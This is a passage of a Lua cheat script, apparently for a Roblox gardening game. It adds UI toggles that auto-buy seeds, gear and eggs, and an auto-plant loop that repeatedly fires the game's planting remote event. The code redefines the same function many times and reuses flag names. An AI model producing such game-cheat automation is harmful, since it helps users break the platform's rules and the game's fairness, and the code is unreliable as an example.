   Name = "auto buy apple", 
   CurrentValue = false,
   Flag = "apple", 
   Callback = function(Value)
      if Value then
          Notification("apple auto buy active!", 0.5, 255, 0, 0)
         apple = true
      elseif not Value then
         apple = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy bamboo", 
   CurrentValue = false,
   Flag = "bamboo", 
   Callback = function(Value)
      if Value then
          Notification("bamboo auto buy active!", 0.5, 255, 0, 0)
         bamboo = true
      elseif not Value then
         bamboo = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy coconut", 
   CurrentValue = false,
   Flag = "coconut", 
   Callback = function(Value)
      if Value then
          Notification("coconut auto buy active!", 0.5, 255, 0, 0)
         coconut = true
      elseif not Value then
         coconut = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy cactus", 
   CurrentValue = false,
   Flag = "cactus", 
   Callback = function(Value)
      if Value then
          Notification("cactus auto buy active!", 0.5, 255, 0, 0)
         cactus = true
      elseif not Value then
         cactus = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy dragon fruit", 
   CurrentValue = false,
   Flag = "dragon_fruit", 
   Callback = function(Value)
      if Value then
          Notification("dragon fruit auto buy active!", 0.5, 255, 0, 0)
         dragon_fruit = true
      elseif not Value then
         dragon_fruit = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy mango", 
   CurrentValue = false,
   Flag = "mango", 
   Callback = function(Value)
      if Value then
          Notification("mango auto buy active!", 0.5, 255, 0, 0)
         mango = true
      elseif not Value then
         mango = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy grape", 
   CurrentValue = false,
   Flag = "grape", 
   Callback = function(Value)
      if Value then
          Notification("grape auto buy active!", 0.5, 255, 0, 0)
         grape = true
      elseif not Value then
         grape = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy mushroom", 
   CurrentValue = false,
   Flag = "mushroom", 
   Callback = function(Value)
      if Value then
          Notification("mushroom auto buy active!", 0.5, 255, 0, 0)
         mushroom = true
      elseif not Value then
         mushroom = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy pepper", 
   CurrentValue = false,
   Flag = "pepper", 
   Callback = function(Value)
      if Value then
          Notification("pepper auto buy active!", 0.5, 255, 0, 0)
         pepper = true
      elseif not Value then
         pepper = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy cacao", 
   CurrentValue = false,
   Flag = "cacao", 
   Callback = function(Value)
      if Value then
          Notification("cacao auto buy active!", 0.5, 255, 0, 0)
         cacao = true
      elseif not Value then
         cacao = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy beanstalk", 
   CurrentValue = false,
   Flag = "bean", 
   Callback = function(Value)
      if Value then
          Notification("beanstalk auto buy active !MAYBE NOT WORK!", 0.5, 255, 255, 0)
         bean = true
      elseif not Value then
         bean = false
      end
   end,
})

local Section = Tab:CreateSection("Gear")

local Toggle = Tab:CreateToggle({
   Name = "auto buy watering can", 
   CurrentValue = false,
   Flag = "water", 
   Callback = function(Value)
      if Value then
          Notification("watering can auto buy active!", 0.5, 255, 0, 0)
         watering = true
      elseif not Value then
         watering = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy trowl tool", 
   CurrentValue = false,
   Flag = "trowl", 
   Callback = function(Value)
      if Value then
          Notification("trowl tool auto buy active!", 0.5, 255, 0, 0)
         trowl = true
      elseif not Value then
         trowl = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy basic sprinkler", 
   CurrentValue = false,
   Flag = "water", 
   Callback = function(Value)
      if Value then
          Notification("basic sprinkler auto buy active!", 0.5, 255, 0, 0)
         basic = true
      elseif not Value then
         basic = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy advanced sprinkler", 
   CurrentValue = false,
   Flag = "water", 
   Callback = function(Value)
      if Value then
          Notification("advanced auto buy active!", 0.5, 255, 0, 0)
         advanced = true
      elseif not Value then
         advanced = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy godly sprinkler", 
   CurrentValue = false,
   Flag = "water", 
   Callback = function(Value)
      if Value then
          Notification("godly sprinkler auto buy active!", 0.5, 255, 0, 0)
         godly = true
      elseif not Value then
         godly = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy lightning rod", 
   CurrentValue = false,
   Flag = "light", 
   Callback = function(Value)
      if Value then
          Notification("lightning auto buy active!", 0.5, 255, 0, 0)
         light = true
      elseif not Value then
        light = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy master sprinkler", 
   CurrentValue = false,
   Flag = "master", 
   Callback = function(Value)
      if Value then
          Notification("master sprinkler auto buy active!", 0.5, 255, 0, 0)
         master = true
      elseif not Value then
        master = false
      end
   end,
})

local Section = Tab:CreateSection("Egg Shop")

local Toggle = Tab:CreateToggle({
   Name = "auto buy Common Egg", 
   CurrentValue = false,
   Flag = "commonegg", 
   Callback = function(Value)
commonegg = Value
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy Uncommon Egg", 
   CurrentValue = false,
   Flag = "uncommonegg", 
   Callback = function(Value)
       uncommonegg = Value
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy Rare Egg", 
   CurrentValue = false,
   Flag = "rareegg", 
   Callback = function(Value)
       rareegg = Value
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy Legendary Egg", 
   CurrentValue = false,
   Flag = "legendaryegg", 
   Callback = function(Value)
       legendaryegg = Value
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy Mythical Egg", 
   CurrentValue = false,
   Flag = "mythicalegg", 
   Callback = function(Value)
       mythicalegg = Value
   end,
})


local Toggle = Tab:CreateToggle({
   Name = "auto buy Bug Egg", 
   CurrentValue = false,
   Flag = "mythicalegg", 
   Callback = function(Value)
       bugegg = Value
   end,
})

local Section = Tab:CreateSection("Limited")

local Toggle = Tab:CreateToggle({
   Name = "auto buy banana", 
   CurrentValue = false,
   Flag = "babnana", 
   Callback = function(Value)
      if Value then
          Notification("banana auto buy active!", 0.5, 255, 255, 0)
         banana = true
      elseif not Value then
         banana = false
      end
   end,
})

local ToggleMysterious = Tab:CreateToggle({
   Name = "auto buy Mysterious Crate", 
   CurrentValue = false,
   Flag = "Mysterious Crate", 
   Callback = function(Value)
      if Value then
         Notification("Mysterious Crate auto buy active!", 0.5, 255, 255, 0)
         Mysterious = true
      else
         Mysterious = false
      end
   end,
})

local ToggleNightEgg = Tab:CreateToggle({
   Name = "auto buy Night Egg", 
   CurrentValue = false,
   Flag = "Night Egg", 
   Callback = function(Value)
      if Value then
         Notification("Night Egg auto buy active!", 0.5, 255, 255, 0)
         NightEgg = true
      else
         NightEgg = false
      end
   end,
})

local ToggleNightSeedPack = Tab:CreateToggle({
   Name = "auto buy Night Seed Pack", 
   CurrentValue = false,
   Flag = "Night Seed Pack", 
   Callback = function(Value)
      if Value then
         Notification("Night Seed Pack auto buy active!", 0.5, 255, 255, 0)
         NightSeedPack = true
      else
         NightSeedPack = false
      end
   end,
})

local ToggleBloodBanana = Tab:CreateToggle({
   Name = "auto buy Blood Banana Seed", 
   CurrentValue = false,
   Flag = "Blood Banana Seed", 
   Callback = function(Value)
      if Value then
         Notification("Blood Banana Seed auto buy active!", 0.5, 255, 255, 0)
         BloodBanana = true
      else
         BloodBanana = false
      end
   end,
})

local ToggleMoonMelon = Tab:CreateToggle({
   Name = "auto buy Moon Melon Seed", 
   CurrentValue = false,
   Flag = "Moon Melon Seed", 
   Callback = function(Value)
      if Value then
         Notification("Moon Melon Seed auto buy active!", 0.5, 255, 255, 0)
         MoonMelon = true
      else
         MoonMelon = false
      end
   end,
})

local ToggleStarCaller = Tab:CreateToggle({
   Name = "auto buy Star Caller", 
   CurrentValue = false,
   Flag = "Star Caller", 
   Callback = function(Value)
      if Value then
         Notification("Star Caller auto buy active!", 0.5, 255, 255, 0)
         StarCaller = true
      else
         StarCaller = false
      end
   end,
})

local ToggleBloodHedgehog = Tab:CreateToggle({
   Name = "auto buy Blood Hedgehog", 
   CurrentValue = false,
   Flag = "Blood Hedgehog", 
   Callback = function(Value)
      if Value then
         Notification("Blood Hedgehog auto buy active!", 0.5, 255, 255, 0)
         BloodHedgehog = true
      else
         BloodHedgehog = false
      end
   end,
})

local ToggleBloodKiwi = Tab:CreateToggle({
   Name = "auto buy Blood Kiwi", 
   CurrentValue = false,
   Flag = "Blood Kiwi", 
   Callback = function(Value)
      if Value then
         Notification("Blood Kiwi auto buy active!", 0.5, 255, 255, 0)
         BloodKiwi = true
      else
         BloodKiwi = false
      end
   end,
})

local ToggleBloodOwl = Tab:CreateToggle({
   Name = "auto buy Blood Owl", 
   CurrentValue = false,
   Flag = "Blood Owl", 
   Callback = function(Value)
      if Value then
         Notification("Blood Owl auto buy active!", 0.5, 255, 255, 0)
         BloodOwl = true
      else
         BloodOwl = false
      end
   end,
})

local Section = Tab:CreateSection("Easter stuff (MAY NOT WORK)")

local ToggleChocolateCarrot = Tab:CreateToggle({
   Name = "auto buy Chocolate Carrot Seed", 
   CurrentValue = false,
   Flag = "Chocolate Carrot Seed", 
   Callback = function(Value)
      if Value then
         Notification("Chocolate Carrot Seed auto buy active!", 0.5, 255, 255, 0)
         ChocolateCarrot = true
      else
         ChocolateCarrot = false
      end
   end,
})

local ToggleRedLollipop = Tab:CreateToggle({
   Name = "auto buy Red Lollipop", 
   CurrentValue = false,
   Flag = "Red Lollipop", 
   Callback = function(Value)
      if Value then
         Notification("Red Lollipop auto buy active!", 0.5, 255, 255, 0)
         RedLollipop = true
      else
         RedLollipop = false
      end
   end,
})

local ToggleCandySunflower = Tab:CreateToggle({
   Name = "auto buy Candy Sunflower", 
   CurrentValue = false,
   Flag = "Candy Sunflower", 
   Callback = function(Value)
      if Value then
         Notification("Candy Sunflower auto buy active!", 0.5, 255, 255, 0)
         CandySunflower = true
      else
         CandySunflower = false
      end
   end,
})

local ToggleEasterEgg = Tab:CreateToggle({
   Name = "auto buy Easter Egg", 
   CurrentValue = false,
   Flag = "Easter Egg", 
   Callback = function(Value)
      if Value then
         Notification("Easter Egg auto buy active!", 0.5, 255, 255, 0)
         EasterEgg = true
      else
         EasterEgg = false
      end
   end,
})

local ToggleChocolateSprinkler = Tab:CreateToggle({
   Name = "auto buy Chocolate Sprinkler", 
   CurrentValue = false,
   Flag = "Chocolate Sprinkler", 
   Callback = function(Value)
      if Value then
         Notification("Chocolate Sprinkler auto buy active!", 0.5, 255, 255, 0)
         ChocolateSprinkler = true
      else
         ChocolateSprinkler = false
      end
   end,
})

local ToggleCandyBlossom = Tab:CreateToggle({
   Name = "auto buy Candy Blossom", 
   CurrentValue = false,
   Flag = "Candy Blossom", 
   Callback = function(Value)
      if Value then
         Notification("Candy Blossom auto buy active!", 0.5, 255, 255, 0)
         CandyBlossom = true
      else
         CandyBlossom = false
      end
   end,
})


local APTab = Window:CreateTab("Auto Plant", 4483362458)

-- Variables
local FarmFolder = workspace:WaitForChild("Farm")
local LocalPlayer = game:GetService("Players").LocalPlayer
local AutoPlantEnabled = false
local PlantingThread

-- Functions from your script
local function FindPlayersFarm(PlayersName)
    for _, Descendant in ipairs(FarmFolder:GetDescendants()) do
        if Descendant.Name == "Owner" and Descendant.Value == PlayersName then
            return Descendant:FindFirstAncestor("Farm")
        end
    end
end

local function MakeStringSmaller(String, maxLength)
    return string.sub(String, 1, math.min(#String, maxLength))
end

function HoldItem(ItemName)
    local BackPack = LocalPlayer:FindFirstChild("Backpack")
    local StringLength = #ItemName
    for _, child in ipairs(BackPack:GetChildren()) do
        local result = MakeStringSmaller(child.Name, StringLength)
        if result == ItemName and not child:FindFirstChild("Item_Seed") then
            child.Parent = LocalPlayer.Character
            return true
        end
    end
    for _, child in ipairs(LocalPlayer.Character:GetChildren()) do
        local result = string.match(child.Name, "%a+")
        if result == ItemName and not child:FindFirstChild("Item_Seed") then
            child.Parent = LocalPlayer.Character
            return true
        end
    end
end
 player = game.Players.LocalPlayer
 mouse = player:GetMouse()

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)
if value then
part = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part.Size = Vector3.new(0.8, 1.65, 0.8)
part.Anchored = true
part.CanCollide = false
part.Position = Vector3.new(0, 5, 0)
part.Transparency = 0.5
part.Parent = workspace
end

if not value then
part:remove()
    end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part.Position
	part.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Carrot Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Carrot", true)

            end)
        else
 
            if PlantingThread then
                startseedplacing("", false)
                part:remove()
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part2 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part2.Size = Vector3.new(0.8, 1.65, 0.8)
part2.Anchored = true
part2.CanCollide = false
part2.Position = Vector3.new(0, 5, 0)
part2.Transparency = 0.5
part2.Parent = workspace
end

if not value then
part2:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part2.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part2.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part2.Position
	part2.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Strawberry Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Strawberry", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part3 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part3.Size = Vector3.new(0.8, 1.65, 0.8)
part3.Anchored = true
part3.CanCollide = false
part3.Position = Vector3.new(0, 5, 0)
part3.Transparency = 0.5
part3.Parent = workspace
end

if not value then
part3:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part3.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part3.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part3.Position
	part3.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Blueberry Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Blueberry", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part4 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part4.Size = Vector3.new(0.8, 1.65, 0.8)
part4.Anchored = true
part4.CanCollide = false
part4.Position = Vector3.new(0, 5, 0)
part4.Transparency = 0.5
part4.Parent = workspace
end

if not value then
part4:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part4.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part4.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part4.Position
	part4.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Orange Tulip Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Orange Tulip", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part5 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part5.Size = Vector3.new(0.8, 1.65, 0.8)
part5.Anchored = true
part5.CanCollide = false
part5.Position = Vector3.new(0, 5, 0)
part5.Transparency = 0.5
part5.Parent = workspace
end

if not value then
part5:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part5.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part5.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part5.Position
	part5.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Tomato Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Tomato", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part6 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part6.Size = Vector3.new(0.8, 1.65, 0.8)
part6.Anchored = true
part6.CanCollide = false
part6.Position = Vector3.new(0, 5, 0)
part6.Transparency = 0.5
part6.Parent = workspace
end

if not value then
part6:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part6.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part6.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part6.Position
	part6.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Corn Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Corn", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part7 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part7.Size = Vector3.new(0.8, 1.65, 0.8)
part7.Anchored = true
part7.CanCollide = false
part7.Position = Vector3.new(0, 5, 0)
part7.Transparency = 0.5
part7.Parent = workspace
end

if not value then
part7:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part7.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part7.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part7.Position
	part7.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Daffodil Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Daffodil", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part8 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part8.Size = Vector3.new(0.8, 1.65, 0.8)
part8.Anchored = true
part8.CanCollide = false
part8.Position = Vector3.new(0, 5, 0)
part8.Transparency = 0.5
part8.Parent = workspace
end

if not value then
part8:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part8.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part8.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part8.Position
	part8.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Watermelon Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Watermelon", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part9 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part9.Size = Vector3.new(0.8, 1.65, 0.8)
part9.Anchored = true
part9.CanCollide = false
part9.Position = Vector3.new(0, 5, 0)
part9.Transparency = 0.5
part9.Parent = workspace
end

if not value then
part9:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part9.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part9.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part9.Position
	part9.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Pumpkin Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Pumpkin", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part10 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part10.Size = Vector3.new(0.8, 1.65, 0.8)
part10.Anchored = true
part10.CanCollide = false
part10.Position = Vector3.new(0, 5, 0)
part10.Transparency = 0.5
part10.Parent = workspace
end

if not value then
part10:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part10.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part10.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part10.Position
	part10.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Apple Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Apple", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part11 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part11.Size = Vector3.new(0.8, 1.65, 0.8)
part11.Anchored = true
part11.CanCollide = false
part11.Position = Vector3.new(0, 5, 0)
part11.Transparency = 0.5
part11.Parent = workspace
end

if not value then
part11:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part11.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part11.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part11.Position
	part11.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Bamboo Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Bamboo", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing(seedname, value)
local locked = false 
car = mouse.Button1Down:Connect(function()
	if not locked then
		locked = true
        car:Disconnect()
	end
end)

if value then
part12 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
part12.Size = Vector3.new(0.8, 1.65, 0.8)
part12.Anchored = true
part12.CanCollide = false
part12.Position = Vector3.new(0, 5, 0)
part12.Transparency = 0.5
part12.Parent = workspace
end

if not value then
part12:remove()
end

rotation = 0


while value do
task.wait()
HoldItem(seedname)
local pos = part12.Position

    rotation = rotation + math.rad(1) -- 1 degree per frame
    if rotation > math.pi * 2 then
        rotation = 0
    end

if not locked then
		mousePos = mouse.Hit.Position
		part12.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
	else
	currentPos = part12.Position
	part12.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
	end
    end
end


-- Toggle Logic
APTab:CreateToggle({
    Name = "Auto Plant Coconut Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Coconut", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local function startseedplacing13(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
